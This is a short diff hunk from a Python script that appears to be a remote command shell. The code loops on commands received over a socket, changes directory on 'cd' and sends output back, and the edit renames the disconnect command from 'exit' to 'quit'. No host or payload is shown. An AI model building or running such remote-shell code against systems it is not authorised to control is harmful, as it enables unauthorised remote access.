@@ -12,7 +12,7 @@ while True:
 		os.chdir(str(cmd[3:]))
 		o = " "
 		s.send(o)
-	elif cmd == "exit":
+	elif cmd == "quit":
 		s.close()
 		sys.exit(1)
 	else:
